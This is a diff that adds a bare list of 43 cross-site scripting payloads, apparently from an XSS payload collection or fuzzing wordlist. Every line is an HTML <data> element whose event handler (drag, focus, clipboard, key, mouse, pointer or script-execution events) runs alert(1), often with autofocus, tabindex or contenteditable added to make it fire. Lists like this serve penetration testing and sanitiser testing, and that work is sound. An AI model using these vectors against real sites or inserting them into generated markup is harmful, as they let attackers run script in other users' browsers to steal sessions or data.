@@ -1,0 +1,43 @@
+<data draggable="true" ondrag="alert(1)">test</data>
+<data draggable="true" ondragend="alert(1)">test</data>
+<data draggable="true" ondragenter="alert(1)">test</data>
+<data draggable="true" ondragleave="alert(1)">test</data>
+<data draggable="true" ondragstart="alert(1)">test</data>
+<data id=x tabindex=1 onactivate=alert(1)></data>
+<data id=x tabindex=1 onbeforeactivate=alert(1)></data>
+<data id=x tabindex=1 onbeforedeactivate=alert(1)></data><input autofocus>
+<data id=x tabindex=1 ondeactivate=alert(1)></data><input id=y autofocus>
+<data id=x tabindex=1 onfocus=alert(1)></data>
+<data id=x tabindex=1 onfocusin=alert(1)></data>
+<data onafterscriptexecute=alert(1)><script>1</script>
+<data onbeforecopy="alert(1)" contenteditable>test</data>
+<data onbeforecut="alert(1)" contenteditable>test</data>
+<data onbeforepaste="alert(1)" contenteditable>test</data>
+<data onbeforescriptexecute=alert(1)><script>1</script>
+<data onblur=alert(1) tabindex=1 id=x></data><input autofocus>
+<data onclick="alert(1)">test</data>
+<data oncontextmenu="alert(1)">test</data>
+<data oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<data oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<data ondblclick="alert(1)" autofocus tabindex=1>test</data>
+<data onfocusout=alert(1) tabindex=1 id=x></data><input autofocus>
+<data onkeydown="alert(1)" contenteditable>test</data>
+<data onkeypress="alert(1)" contenteditable>test</data>
+<data onkeyup="alert(1)" contenteditable>test</data>
+<data onmousedown="alert(1)">test</data>
+<data onmouseenter="alert(1)">test</data>
+<data onmouseleave="alert(1)">test</data>
+<data onmousemove="alert(1)">test</data>
+<data onmouseout="alert(1)">test</data>
+<data onmouseover="alert(1)">test</data>
+<data onmouseup="alert(1)">test</data>
+<data onmousewheel=alert(1)>requires scrolling
+<data onpaste="alert(1)" contenteditable>test</data>
+<data onpointerdown=alert(1)>XSS</data>
+<data onpointerenter=alert(1)>XSS</data>
+<data onpointerleave=alert(1)>XSS</data>
+<data onpointermove=alert(1)>XSS</data>
+<data onpointerout=alert(1)>XSS</data>
+<data onpointerover=alert(1)>XSS</data>
+<data onpointerrawupdate=alert(1)>XSS</data>
+<data onpointerup=alert(1)>XSS</data>
